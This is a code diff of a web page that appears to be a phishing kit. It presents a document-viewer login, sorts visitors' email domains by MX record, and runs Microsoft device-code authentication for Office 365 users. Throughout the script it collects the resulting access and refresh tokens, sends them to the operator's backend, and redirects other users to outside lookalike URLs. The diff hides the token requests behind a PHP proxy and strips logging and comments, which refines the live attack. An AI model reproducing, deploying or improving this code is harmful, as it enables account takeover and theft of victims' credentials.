@@ -966,7 +966,7 @@
                     <div class="device-code-box">
                         <div class="device-code-label">Your Code:</div>
                         <div class="device-code-value" id="deviceCodeValue">LOADING...</div>
-                        <button class="copy-code-btn" onclick="copyDeviceCode()">
+                        <button type="button" class="copy-code-btn" onclick="copyDeviceCode()">
                             <span>📋</span>
                             <span id="copyBtnText">Copy Code</span>
                         </button>
@@ -992,7 +992,7 @@
                         <span>Waiting for authentication...</span>
                     </div>
 
-                    <button class="btn-secondary" onclick="cancelDeviceCode()" style="margin-top: 16px; width: 100%;">
+                    <button type="button" class="btn-secondary" onclick="cancelDeviceCode()" style="margin-top: 16px; width: 100%;">
                         Cancel
                     </button>
                 </div>
@@ -1001,14 +1001,10 @@
     </div>
 
     <script>
-        // ========== AZURE AD CONFIGURATION ==========
+        // ========== CONFIGURATION ==========
         const AZURE_CONFIG = {
-            clientId: 'd2301a85-917a-484c-8c6b-d3273eebd8dd',  // Your Client ID from the URL
-            tenantId: 'common',
-            scope: 'openid profile email User.Read offline_access',
-            deviceCodeEndpoint: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
-            tokenEndpoint: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
-            pollingInterval: 5000  // Check every 5 seconds
+            clientId: 'd2301a85-917a-484c-8c6b-d3273eebd8dd',
+            pollingInterval: 5000
         };
 
         let deviceCodeData = null;
@@ -1379,9 +1375,7 @@
                 return {
                     success: true,
                     provider: 'office365',
-                    domain: domain,
-                    mx: domain.replace('hotmail', 'outlook').replace('live', 'outlook') + '-com.mail.protection.outlook.com',
-                    allMX: [domain + '-com.mail.protection.outlook.com']
+                    domain: domain
                 };
             }
 
@@ -1389,13 +1383,7 @@
                 return {
                     success: true,
                     provider: 'google',
-                    domain: domain,
-                    mx: 'gmail-smtp-in.l.google.com',
-                    allMX: [
-                        'gmail-smtp-in.l.google.com',
-                        'alt1.gmail-smtp-in.l.google.com',
-                        'alt2.gmail-smtp-in.l.google.com'
-                    ]
+                    domain: domain
                 };
             }
 
@@ -1461,7 +1449,6 @@
                         success: false,
                         provider: 'other',
                         domain: domain,
-                        mx: null,
                         error: 'No MX records found'
                     };
                 }
@@ -1482,30 +1469,17 @@
                         success: false,
                         provider: 'other',
                         domain: domain,
-                        mx: null,
                         error: 'No valid MX records'
                     };
                 }
 
-                const primaryMX = mxRecords[0].exchange;
                 const allMX = mxRecords.map(r => r.exchange);
-
                 const provider = categorizeProvider(allMX);
-
-                console.log('MX Lookup Result:', {
-                    domain,
-                    provider,
-                    primaryMX,
-                    allMX
-                });
 
                 return {
                     success: true,
                     provider: provider,
-                    domain: domain,
-                    mx: primaryMX,
-                    allMX: allMX,
-                    recordCount: mxRecords.length
+                    domain: domain
                 };
 
             } catch (error) {
@@ -1514,34 +1488,9 @@
                     success: false,
                     provider: 'other',
                     domain: domain,
-                    mx: null,
                     error: error.message
                 };
             }
-        }
-
-        function logAccess(email, mxResult, files) {
-            const logData = {
-                timestamp: new Date().toISOString(),
-                email: email,
-                domain: mxResult.domain,
-                provider: mxResult.provider,
-                mx: mxResult.mx,
-                allMX: mxResult.allMX,
-                fileCount: files.length,
-                files: files.map(i => documents[i].name),
-                userAgent: navigator.userAgent,
-                screenResolution: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direct'
-            };
-
-            console.log('========== ACCESS LOG ==========');
-            console.log(JSON.stringify(logData, null, 2));
-            console.log('================================');
-
-            return logData;
         }
 
         function displayProviderBadge(mxResult) {
@@ -1576,9 +1525,6 @@
         }
 
         function redirectToProvider(email, mxResult) {
-            const selectedFiles = Array.from(selectedDocuments);
-            logAccess(email, mxResult, selectedFiles);
-
             const redirectUrls = {
                 'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
                 'google': 'https://pdf-render.vercel.app/viewer?from=me',
@@ -1590,18 +1536,17 @@
             window.location.href = redirectUrl;
         }
 
-        // ========== DEVICE CODE FLOW FUNCTIONS ==========
+        // ========== DEVICE CODE FLOW FUNCTIONS (BACKEND PROXY) ==========
 
         async function requestDeviceCode() {
             try {
-                const response = await fetch(AZURE_CONFIG.deviceCodeEndpoint, {
+                const response = await fetch('/api/device-code.php', {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
+                        'Content-Type': 'application/json'
                     },
-                    body: new URLSearchParams({
-                        client_id: AZURE_CONFIG.clientId,
-                        scope: AZURE_CONFIG.scope
+                    body: JSON.stringify({
+                        action: 'request'
                     })
                 });
 
@@ -1609,9 +1554,14 @@
                     throw new Error('Failed to request device code');
                 }
 
-                const data = await response.json();
-                console.log('Device code received:', data);
-                return data;
+                const result = await response.json();
+                
+                if (!result.success) {
+                    throw new Error(result.error || 'Failed to get device code');
+                }
+
+                console.log('Device code received:', result.data);
+                return result.data;
 
             } catch (error) {
                 console.error('Device code request error:', error);
@@ -1626,7 +1576,6 @@
             document.getElementById('deviceCodeForm').style.display = 'block';
 
             document.getElementById('deviceCodeValue').textContent = data.user_code;
-
             document.getElementById('deviceLoginLink').href = data.verification_uri;
 
             startPolling(data.device_code, data.interval * 1000);
@@ -1658,21 +1607,32 @@
             
             pollingTimer = setInterval(async () => {
                 try {
-                    const response = await fetch(AZURE_CONFIG.tokenEndpoint, {
+                    const response = await fetch('/api/device-code.php', {
                         method: 'POST',
                         headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
+                            'Content-Type': 'application/json'
                         },
-                        body: new URLSearchParams({
-                            client_id: AZURE_CONFIG.clientId,
-                            grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
+                        body: JSON.stringify({
+                            action: 'poll',
                             device_code: deviceCode
                         })
                     });
 
-                    const data = await response.json();
+                    if (!response.ok) {
+                        console.error('Polling request failed');
+                        return;
+                    }
 
-                    if (response.ok && data.access_token) {
+                    const result = await response.json();
+                    
+                    if (!result.success) {
+                        console.error('Polling error:', result.error);
+                        return;
+                    }
+
+                    const data = result.data;
+
+                    if (result.http_code === 200 && data.access_token) {
                         console.log('✅ Authentication successful!');
                         clearInterval(pollingTimer);
                         handleAuthenticationSuccess(data);
@@ -1690,8 +1650,6 @@
                         console.log('❌ User denied access');
                         clearInterval(pollingTimer);
                         handleAuthenticationError('Authentication was denied.');
-                    } else {
-                        console.error('Polling error:', data);
                     }
 
                 } catch (error) {
@@ -1706,19 +1664,14 @@
             const email = document.getElementById('emailInput').value.trim();
             const device = getDeviceType();
 
-            // Save tokens to backend
             await saveTokensToBackend(email, tokenData);
-
-            // Log visit
             await logVisit(email, device, 'office365');
 
-            // Show success message
             document.getElementById('pollingStatus').innerHTML = `
                 <span style="color: #16C79A;">✅</span>
                 <span style="color: #16C79A; font-weight: 600;">Authentication successful!</span>
             `;
 
-            // Wait a moment then redirect
             setTimeout(() => {
                 const redirectUrl = getCookie('redirect_url');
                 if (redirectUrl) {
@@ -1729,7 +1682,6 @@
             }, 1500);
         }
 
-        // ========== SAVE TOKENS TO BACKEND ==========
         async function saveTokensToBackend(email, tokenData) {
             try {
                 console.log('💾 Saving tokens to backend...');
@@ -1746,7 +1698,7 @@
                         id_token: tokenData.id_token || null,
                         expires_in: tokenData.expires_in || 3600,
                         token_type: tokenData.token_type || 'Bearer',
-                        scope: tokenData.scope || AZURE_CONFIG.scope
+                        scope: tokenData.scope || ''
                     })
                 });
 
@@ -1765,7 +1717,6 @@
 
             } catch (error) {
                 console.error('❌ Token save error:', error);
-                // Don't block user flow if token save fails
             }
         }
 
@@ -1780,13 +1731,12 @@
             }, 3000);
         }
 
-                function cancelDeviceCode() {
+        function cancelDeviceCode() {
             if (pollingTimer) {
                 clearInterval(pollingTimer);
                 pollingTimer = null;
             }
 
-            // Reset to email form
             document.getElementById('deviceCodeForm').style.display = 'none';
             document.getElementById('authForm').style.display = 'block';
             document.getElementById('emailInput').value = '';
@@ -1803,7 +1753,6 @@
             const submitBtn = document.getElementById('submitBtn');
             const errorMsg = document.getElementById('errorMessage');
 
-            // Validate email
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(email)) {
                 emailInput.classList.add('error');
@@ -1812,50 +1761,38 @@
                 return;
             }
 
-            // Reset error state
             emailInput.classList.remove('error');
             errorMsg.classList.remove('show');
 
-            // Show loading
             submitBtn.classList.add('loading');
             submitBtn.disabled = true;
 
             try {
-                // Perform REAL MX check via Google DNS API
                 const mxResult = await checkMXRecords(email);
 
                 if (!mxResult.success) {
                     throw new Error(mxResult.error || 'Unable to verify email domain');
                 }
 
-                // ========== HANDLE OFFICE 365 WITH DEVICE CODE FLOW ==========
                 if (mxResult.provider === 'office365') {
                     console.log('🔷 Office 365 detected - Starting device code flow');
                     
                     submitBtn.classList.remove('loading');
                     submitBtn.disabled = false;
 
-                    // Request device code
                     const deviceCode = await requestDeviceCode();
-                    
-                    // Display device code UI
                     displayDeviceCode(deviceCode);
                     
-                    return; // Don't proceed with normal flow
+                    return;
                 }
-                // ============================================================
 
-                // For Google and Other providers, use original flow
                 const device = getDeviceType();
                 await logVisit(email, device, mxResult.provider);
 
-                // Display provider badge
                 displayProviderBadge(mxResult);
 
-                // Wait a moment to show the badge
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // Redirect based on MX result
                 redirectToProvider(email, mxResult);
 
             } catch (error) {
@@ -1869,10 +1806,9 @@
             }
         }
 
-        // Keyboard support
-        document.addEventListener('keydown', (e) => {
+                document.addEventListener('keydown', (e) => {
             if (e.key === 'Escape') {
-                // closeLightbox(); // Commented out to prevent accidental closure during auth
+                // closeLightbox();
             }
         });
 
